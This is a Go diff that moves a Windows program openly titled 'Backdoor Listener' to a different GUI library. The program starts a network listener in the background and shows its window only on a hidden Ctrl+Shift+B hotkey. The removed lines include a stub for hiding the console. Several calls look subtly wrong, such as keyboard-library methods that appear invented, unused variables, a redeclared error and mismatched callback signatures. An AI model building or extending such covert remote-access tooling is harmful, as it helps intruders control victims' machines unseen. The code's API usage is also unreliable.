@@ -1,3 +1,5 @@
+//go:build windows
+
 package main
 
 import (
@@ -14,9 +16,9 @@ import (
 	"sync"
 	"time"
 
-	"github.com/andlabs/ui"
-	_ "github.com/andlabs/ui" // Use the native UI backend
-	"github.com/micmonay/keybd_event" // Corrected import
+	"github.com/micmonay/keybd_event" // Corrected import for keyboard events
+	"github.com/lxn/walk"
+	"github.com/lxn/walk/declarative"
 )
 
 const (
@@ -27,14 +29,16 @@ const (
 
 var (
 	listenerConn      net.Conn
-	uiMutex           sync.Mutex
-	mainWindow        *ui.Window
-	addressEntry      *ui.Entry
-	portEntry         *ui.Entry
-	connectButton     *ui.Button
-	logText           *ui.MultilineEntry
+	mainWindow        *walk.MainWindow
+	addressLineEdit   *walk.LineEdit
+	portLineEdit      *walk.LineEdit
+	connectButton     *walk.PushButton
+	logTextEdit       *walk.TextEdit
 	stopListener      chan struct{}
 	startListenerOnce sync.Once
+	kb                keybd_event.Keybd
+	uiVisible         bool
+	uiMutexLocal      sync.Mutex
 )
 
 type Config struct {
@@ -172,97 +176,83 @@ func stopListenerService() {
 	}
 }
 
-func updateUIConfig() {
-	uiMutex.Lock()
-	defer uiMutex.Unlock()
-	config := loadConfig()
-	addressEntry.SetText(config.Host)
-	portEntry.SetText(config.Port)
-}
-
-func connectButtonHandler(button *ui.Button) {
-	uiMutex.Lock()
-	defer uiMutex.Unlock()
-	host := addressEntry.Text()
-	port := portEntry.Text()
+func connectButtonHandler() {
+	host := addressLineEdit.Text()
+	port := portLineEdit.Text()
 	config := Config{Host: host, Port: port}
 	saveConfig(config)
 	startListener(host, port)
 }
 
 func logMessage(message string) {
-	ui.QueueMain(func() {
-		uiMutex.Lock()
-		defer uiMutex.Unlock()
-		logText.Append(fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message))
+	walk.App.Invoke(func() {
+		if logTextEdit != nil {
+			logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
+		}
 	})
 	log.Println(message) // Also log to the console for debugging
 }
 
 func createUI() {
-	err := ui.Main(func() {
-		mainWindow = ui.NewWindow("Backdoor Listener", 300, 200, false)
-		mainWindow.OnClosing(func(*ui.Window) bool {
+	var err error
+
+	mw, err := declarative.MainWindow{
+		Title:   "Backdoor Listener",
+		MinSize: declarative.Size{Width: 300, Height: 200},
+		Layout:  declarative.VBox{},
+		Children: []declarative.Widget{
+			declarative.Composite{
+				Layout: declarative.Grid{Columns: 2},
+				Children: []declarative.Widget{
+					declarative.Label{Text: "Listen Address:"},
+					declarative.LineEdit{AssignTo: &addressLineEdit},
+					declarative.Label{Text: "Listen Port:"},
+					declarative.LineEdit{AssignTo: &portLineEdit},
+				},
+			},
+			declarative.PushButton{
+				Text:      "Start Listener",
+				AssignTo:  &connectButton,
+				OnClicked: func() { connectButtonHandler() },
+			},
+			declarative.Label{Text: "Log:"},
+			declarative.TextEdit{
+				AssignTo:    &logTextEdit,
+				ReadOnly:    true,
+				VScroll:     true,
+				MultiLine:   true,
+				CompactHeight: false,
+			},
+		},
+		OnClosing: func() {
 			stopListenerService()
-			ui.Quit()
-			return true
-		})
+			walk.App.Exit(0)
+		},
+	}.Run()
 
-		addressLabel := ui.NewLabel("Listen Address:")
-		addressEntry = ui.NewEntry()
-		portLabel := ui.NewLabel("Listen Port:")
-		portEntry = ui.NewEntry()
-		connectButton = ui.NewButton("Start Listener")
-		logLabel := ui.NewLabel("Log:")
-		logText = ui.NewMultilineEntry()
-		logText.SetReadOnly(true)
-
-		config := loadConfig()
-		addressEntry.SetText(config.Host)
-		portEntry.SetText(config.Port)
-
-		connectButton.OnClicked(connectButtonHandler)
-
-		grid := ui.NewGrid()
-		grid.SetPadded(true)
-
-		grid.Append(addressLabel, 0, 0, 1, 1, false, ui.AlignFill, false, ui.AlignFill)
-		grid.Append(addressEntry, 1, 0, 1, 1, true, ui.AlignFill, false, ui.AlignFill)
-		grid.Append(portLabel, 0, 1, 1, 1, false, ui.AlignFill, false, ui.AlignFill)
-		grid.Append(portEntry, 1, 1, 1, 1, true, ui.AlignFill, false, ui.AlignFill)
-		grid.Append(connectButton, 0, 2, 2, 1, true, ui.AlignCenter, false, ui.AlignFill)
-		grid.Append(logLabel, 0, 3, 2, 1, false, ui.AlignFill, false, ui.AlignFill)
-		grid.Append(logText, 0, 4, 2, 1, true, ui.AlignFill, true, ui.AlignFill)
-
-		mainWindow.SetChild(grid)
-		mainWindow.Show()
-
-		// Start the listener with the initial configuration
-		startListener(config.Host, config.Port)
-	})
 	if err != nil {
 		log.Fatal("UI initialization failed:", err)
 	}
 }
 
 func main() {
-	// Hide the console window (Windows specific - might need build flags)
-	if runtime.GOOS == "windows" {
-		//go hideConsole() // Implement hideConsole using syscall if needed
+	if runtime.GOOS != "windows" {
+		fmt.Println("Walk is a Windows-specific GUI library. Please run this on Windows.")
+		return
 	}
 
-	// Global variable to track UI visibility
-	uiVisible := false
-	var uiMutexLocal sync.Mutex
+	var err error
+	kb, err = keybd_event.NewKeybd()
+	if err != nil {
+		log.Fatal("Error creating keybd instance:", err)
+	}
+
+	// Load initial config
+	config := loadConfig()
 
 	// Key combination to toggle UI visibility (Ctrl + Shift + B)
 	hotkey := []keybd_event.KeyCombo{
 		{keybd_event.CtrlKey, keybd_event.ShiftKey, keybd_event.KeyB},
-	}
-
-	kb, err := keybd_event.NewKeybd()
-	if err != nil {
-		log.Fatal("Error creating keybd instance:", err)
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -274,32 +264,25 @@ func main() {
 			case <-ctx.Done():
 				return
 			default:
-				if runtime.GOOS == "windows" { // Hotkey listening might be OS-specific
-					pressed := true
-					for _, k := range hotkey {
-						if !kb.IsPressed(k.Code) {
-							pressed = false
-							break
-						}
+				pressed := true
+				for _, k := range hotkey {
+					if !kb.IsPressed(int(k.Code)) {
+						pressed = false
+						break
 					}
-					if pressed {
-						uiMutexLocal.Lock()
-						if !uiVisible {
-							go createUI()
-							uiVisible = true
-						} else if mainWindow != nil {
-							ui.QueueMain(func() {
-								uiMutex.Lock()
-								defer uiMutex.Unlock()
-								mainWindow.Show()
-							})
-						}
-						uiMutexLocal.Unlock()
-						time.Sleep(time.Millisecond * 500) // Debounce
+				}
+				if pressed {
+					uiMutexLocal.Lock()
+					if !uiVisible {
+						uiVisible = true
+						go createUIWrapper(config)
+					} else if mainWindow != nil {
+						walk.App.Invoke(func() {
+							mainWindow.Show()
+						})
 					}
-				} else {
-					log.Println("Hotkey listening not fully implemented for non-Windows OS with this library.")
-					// You would need to implement OS-specific hotkey listening here
+					uiMutexLocal.Unlock()
+					time.Sleep(time.Millisecond * 500) // Debounce
 				}
 				time.Sleep(time.Millisecond * 100)
 			}
@@ -308,14 +291,56 @@ func main() {
 
 	log.Println("Backdoor listener running in the background. Press Ctrl+Shift+B to open UI.")
 
+	// Start the listener with the initial configuration in the background
+	startListener(config.Host, config.Port)
+
 	// Keep the main goroutine alive
 	select {}
 }
 
-// Placeholder for hiding console on Windows (requires syscall)
-// func hideConsole() {
-// 	hwnd := syscall.GetConsoleWindow()
-// 	if hwnd != 0 {
-// 		syscall.ShowWindow(hwnd, syscall.SW_HIDE)
-// 	}
-// }
+func createUIWrapper(config Config) {
+	walk.NewApp()
+	mw, err := declarative.MainWindow{
+		Title:   "Backdoor Listener",
+		MinSize: declarative.Size{Width: 300, Height: 200},
+		Layout:  declarative.VBox{},
+		Children: []declarative.Widget{
+			declarative.Composite{
+				Layout: declarative.Grid{Columns: 2},
+				Children: []declarative.Widget{
+					declarative.Label{Text: "Listen Address:"},
+					declarative.LineEdit{AssignTo: &addressLineEdit, Text: config.Host},
+					declarative.Label{Text: "Listen Port:"},
+					declarative.LineEdit{AssignTo: &portLineEdit, Text: config.Port},
+				},
+			},
+			declarative.PushButton{
+				Text:      "Start Listener",
+				AssignTo:  &connectButton,
+				OnClicked: func() { connectButtonHandler() },
+			},
+			declarative.Label{Text: "Log:"},
+			declarative.TextEdit{
+				AssignTo:    &logTextEdit,
+				ReadOnly:    true,
+				VScroll:     true,
+				MultiLine:   true,
+				CompactHeight: false,
+			},
+		},
+		OnClosing: func() {
+			stopListenerService()
+			walk.App.Exit(0)
+			uiVisible = false
+			mainWindow = nil
+		},
+		AssignTo: &mainWindow,
+	}.Create()
+
+	if err != nil {
+		log.Fatal("UI creation failed:", err)
+	}
+
+	mainWindow.Show()
+	walk.App.Run()
+}
